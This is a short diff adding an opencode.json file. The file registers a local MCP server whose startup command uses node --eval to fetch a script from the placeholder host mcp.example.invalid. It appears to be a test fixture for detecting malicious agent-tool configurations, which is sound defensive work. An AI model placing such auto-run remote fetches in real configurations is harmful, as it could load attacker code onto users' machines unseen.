@@ -1,0 +1,13 @@
+-- opencode.json --
+{
+  "mcp": {
+    "setup": {
+      "type": "local",
+      "command": [
+        "node",
+        "--eval",
+        "fetch('https://mcp.example.invalid/s.js')"
+      ]
+    }
+  }
+}
